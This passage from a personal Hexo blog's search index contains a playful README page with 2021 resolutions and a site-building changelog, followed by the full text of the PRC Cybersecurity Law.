PS、Pr、Ae、Au、Ai、Dw、Fl、Id、Sg、Sc等软件的安装与卸载</p></div><div class="checkbox times red checked">  <input type="checkbox" checked />  <p>熟悉 Windows、Linux、Mac、Android、IOS等系统的开关机</p></div><div class="checkbox times red checked">  <input type="checkbox" checked />  <p> 操作 <kbd>Ctrl</kbd> + <kbd>C</kbd> && <kbd>Ctrl</kbd> + <kbd>V</kbd> 烂熟于心</p></div><h1>2021のflag</h1><div class="checkbox green checked">  <input type="checkbox" checked />  <p>按时碎觉，狗命要紧</p></div><div class="checkbox blue checked">  <input type="checkbox" checked />  <p>坚持锻炼，坚持更博</p></div><div class="checkbox yellow checked">  <input type="checkbox" checked />  <p>混迹ctf，好好做个签到题选手</p></div><div class="checkbox red checked">  <input type="checkbox" checked />  <p>不做积极废人</p></div><div class="checkbox cyan checked">  <input type="checkbox" checked />  <p>做比昨天更厉害的自己</p></div><div class="timeline"><p class='p h2'>小站破事</p><div class="timenode"><div class="meta"><p><p>2021-05-12</p></p></div><div class="body"><p>🎉🎉🎉可喜可贺，小站破壳百天！</p></div></div><div class="timenode"><div class="meta"><p><p>2021-05-11</p></p></div><div class="body"><ol><li>小站被百度收录（Google早收录了）</li><li>增加Pixiv日榜Top50</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-05-08</p></p></div><div class="body"><p>使用又拍云CDN一天，不知是何原因致使小站无法访问（貌似证书出现问题），无奈换回腾讯云，并买了一年的流量包（12）</p></div></div><div class="timenode"><div class="meta"><p><p>2021-05-07</p></p></div><div class="body"><p>换用 <a href="https://www.upyun.com/">又拍云</a> 为小站提供CDN加速。</p></div></div><div class="timenode"><div class="meta"><p><p>2021-03-26</p></p></div><div class="body"><ol><li>增加 Hexo Magnet</li><li>增加 Butterfly Article Double Row</li><li>增加 Hexo History Calendar</li></ol><p><b style="color:purple">冰老师太厉害啦，插件包一键安装即可食用。</b></p></div></div><div class="timenode"><div class="meta"><p><p>2021-03-24</p></p></div><div class="body"><ol><li>修改了部分位置的字体。</li><li>更换了全局配色。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-03-11</p></p></div><div class="body"><ol><li>小站认真学习了<a href="https://www.wawyw.top/law/">网络安全法</a>，保证以后健康、科学上网！</li><li>忍痛去除了看板娘、樱花飘落、随机背景等效果。</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-03-10</p></p></div><div class="body"><ol><li>增加<a href="https://www.wawyw.top/speak/">碎碎念</a>页面，Powered By <a href="https://artitalk.js.org/">Artitalk</a></li><li>在顶部添加天气插件，参考于<a href="https://cnhuazhu.gitee.io/2021/02/24/Hexo%E9%AD%94%E6%94%B9/Hexo%E5%9C%A8%E9%A1%B6%E9%83%A8%E5%A2%9E%E5%8A%A0%E5%A4%A9%E6%B0%94%E5%B0%8F%E9%83%A8%E4%BB%B6/">Hexo在顶部增加天气小部件</a></li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-03-09</p></p></div><div class="body"><p><a href="https://www.wawyw.top/README/">README</a>页面（此页面）终于更新。外挂标签好用，真的好用。参考于<a href="https://www.antmoe.com/posts/3b43914f/index.html">小康的 butterfly 主题使用文档</a>。</p></div></div><div class="timenode"><div class="meta"><p><p>2021-03-08</p></p></div><div class="body"><p>启用<a href="https://zfe.space/">冰老师</a>的<a href="https://github.com/Zfour/hexo-circle-of-friends">友链朋友圈</a>和<a href="https://github.com/Zfour/hexo-github-calendar">hexo-github-calendar</a>项目，效果很棒，感谢冰老师的指导！</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-08</p></p></div><div class="body"><p>使用 <a href="https://cloud.tencent.com/product/cdn/">腾讯云</a> 为小站提供CDN加速。</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-06</p></p></div><div class="body"><p>小站托管于<a href="https://coding.net/">Coding</a>。</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-05</p></p></div><div class="body"><p>域名备案审核通过，<a href="https://beian.miit.gov.cn/">赣ICP备2021001120号</a>。</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-02</p></p></div><div class="body"><p>SSL证书审核通过，再见<code>http</code>，欢迎<code>https</code> ！</p></div></div><div class="timenode"><div class="meta"><p><p>2021-02-01</p></p></div><div class="body"><ol><li><a href="https://www.wawyw.top/">小站正式</a>上线！本站采用<a href="https://hexo.io/">Hexo</a>框架，<a href="https://butterfly.js.org/">Butterfly</a>主题，托管于<a href="https://github.com/">Github</a>，使用 <a href="https://www.jsdelivr.com/">Jsdelivr</a> 为静态资源提供CDN加速。</li><li><a href="https://wanwang.aliyun.com/">阿里云</a>购买域名 <code>wawyw.top</code></li></ol></div></div><div class="timenode"><div class="meta"><p><p>2021-01-31</p></p></div><div class="body"><p>小站即将破壳，反复测试ing…</p></div></div></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>中华人民共和国网络安全法</title>
      <link href="law/index.html"/>
      <url>law/index.html</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章　总　则"></a>第一章　总　则</h1><p>第一条　为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><p>第二条　在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><p>第三条　国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><p>第四条　国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><p>第五条　国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><p>第六条　国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><p>第七条　国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><p>第八条　国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><p>第九条　网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><p>第十条　建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p>第十一条　网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><p>第十二条　国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><p>第十三条　国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><p>第十四条　任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><h1 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章　网络安全支持与促进"></a>第二章　网络安全支持与促进</h1><p>第十五条　国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><p>第十六条　国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><p>第十七条　国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><p>第十八条　国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><p>第十九条　各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><p>第二十条　国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><h1 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章　网络运行安全"></a>第三章　网络运行安全</h1><p>第一节　一般规定</p><p>第二十一条　国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>（四）采取数据分类、重要数据备份和加密等措施；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第二十二条　网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><p>第二十三条　网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><p>第二十四条　网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><p>第二十五条　网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><p>第二十六条　开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><p>第二十七条　任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><p>第二十八条　网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><p>第二十九条　国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><p>第三十条　网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><p>第二节　关键信息基础设施的运行安全</p><p>第三十一条　国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><p>第三十二条　按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><p>第三十三条　建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><p>第三十四条　除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>（三）对重要系统和数据库进行容灾备份；</p><p>（四）制定网络安全事件应急预案，并定期进行演练；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第三十五条　关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><p>第三十六条　关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><p>第三十七条　关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><p>第三十八条　关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><p>第三十九条　国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><h1 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章　网络信息安全"></a>第四章　网络信息安全</h1><p>第四十条　网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><p>第四十一条　网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><p>第四十二条　网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>第四十三条　个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><p>第四十四条　任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><p>第四十五条　依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><p>第四十六条　任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><p>第四十七条　网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><p>第四十八条　任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><p>第四十九条　网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p>第五十条　国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><h1 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章　监测预警与应急处置"></a>第五章　监测预警与应急处置</h1><p>第五十一条　国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><p>第五十二条　负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><p>第五十三条　国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><p>第五十四条　网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><p>第五十五条　发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><p>第五十六条　省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><p>第五十七条　因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><p>第五十八条　因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><h1 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章　法律责任"></a>第六章　法律责任</h1><p>第五十九条　网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p>第六十条　违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>（一）设置恶意程序的；</p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>（三）擅自终止为其产品、服务提供安全维护的。</p><p>第六十一条　网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十二条　违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><p>第六十三条　违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><p>第六十四条　网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><p>第六十五条　关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十六条　关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十七条　违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，</p><p>可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>第六十八条　网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><p>第六十九条　网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><p>第七十条　发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><p>第七十一条　有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><p>第七十二条　国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>第七十三条　网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><p>第七十四条　违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p>第七十五条　境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><h1 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章　附　则"></a>第七章　附　则</h1><p>第七十六条　本法下列用语的含义：</p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><p>第七十七条　存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><p>第七十八条　军事网络的安全保护，由中央军事委员会另行规定。</p><p>第七十九条　本法自2017年6月1日起施行。</p><p>​<br>​<br>​<br>​        </p>]]></content>
      
    </entry>
    
    
  
</search>
